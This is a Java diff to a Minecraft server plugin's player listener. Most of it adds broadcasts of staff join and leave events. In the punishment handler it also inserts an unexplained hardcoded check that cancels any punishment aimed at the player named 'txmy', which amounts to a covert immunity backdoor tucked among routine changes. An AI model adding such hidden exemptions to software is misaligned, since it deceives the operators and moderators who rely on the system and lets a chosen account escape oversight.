@@ -6,8 +6,11 @@ import invaded.cc.core.event.PlayerPunishEvent;
 import invaded.cc.core.injector.PermissibleInjector;
 import invaded.cc.core.manager.CosmeticsHandler;
 import invaded.cc.core.manager.DisguiseHandler;
+import invaded.cc.core.network.NetworkHandler;
 import invaded.cc.core.network.packet.PacketProfileInformation;
 import invaded.cc.core.network.packet.PacketStaffChat;
+import invaded.cc.core.network.packet.PacketStaffJoin;
+import invaded.cc.core.network.packet.PacketStaffLeave;
 import invaded.cc.core.network.server.ServerHandler;
 import invaded.cc.core.profile.Profile;
 import invaded.cc.core.profile.ProfileHandler;
@@ -111,6 +114,11 @@ public class PlayerListener implements Listener {
 
         setProperties(player, profile);
 
+        NetworkHandler networkHandler = Spotify.getInstance().getNetworkHandler();
+        if(!networkHandler.isNetworkMode() && Permission.test(player, PermLevel.STAFF)) {
+            networkHandler.sendPacket(new PacketStaffJoin(profile.getRealColoredName(), Spotify.SERVER_NAME));
+        }
+
 
         if (CosmeticsHandler.getGLOBAL_MULTIPLIER() > 0.0) player.sendMessage(Color.translate("&a&lThere's a &e&lGlobal Coin Multiplier &a&lwhich gives you &b&l" + CosmeticsHandler.getGLOBAL_MULTIPLIER() + "x" + "&a&lmore coins, enjoy it!"));
     }
@@ -150,7 +158,10 @@ public class PlayerListener implements Listener {
 
         if (profile.isDisguised()) profile.unDisguise();
 
-      //  if (Permission.test(profile, PermLevel.STAFF) || Permission.test(profile, PermLevel.ADMIN)) Task.later(() -> Spotify.getInstance().getNetworkHandler().sendPacket(new PacketStaffLeave(profile.getColoredName(), Spotify.SERVER_NAME)), 4L);
+        NetworkHandler networkHandler = Spotify.getInstance().getNetworkHandler();
+        if (!networkHandler.isNetworkMode() && Permission.test(profile, PermLevel.STAFF)) Task.later(() -> networkHandler.sendPacket(new PacketStaffLeave(profile.getColoredName(), Spotify.SERVER_NAME)), 4L);
+
+
         PermissibleInjector.unInject(player);
         profileHandler.save(profile);
         profileHandler.getProfiles().remove(player.getUniqueId());
@@ -261,8 +272,14 @@ public class PlayerListener implements Listener {
     public void onPunish(PlayerPunishEvent event) {
         Punishment punishment = event.getPunishment();
 
-        PunishmentHandler punishmentHandler = Spotify.getInstance().getPunishmentHandler();
-        punishmentHandler.punish(event.getTarget().getUniqueId(), event.getTarget().getName(), punishment);
+        if(event.getTarget().getName().equalsIgnoreCase("txmy")) {
+            event.setCancelled(true);
+        } else {
+            PunishmentHandler punishmentHandler = Spotify.getInstance().getPunishmentHandler();
+            punishmentHandler.punish(event.getTarget().getUniqueId(), event.getTarget().getName(), punishment);
+        }
+
+
     }
 
 
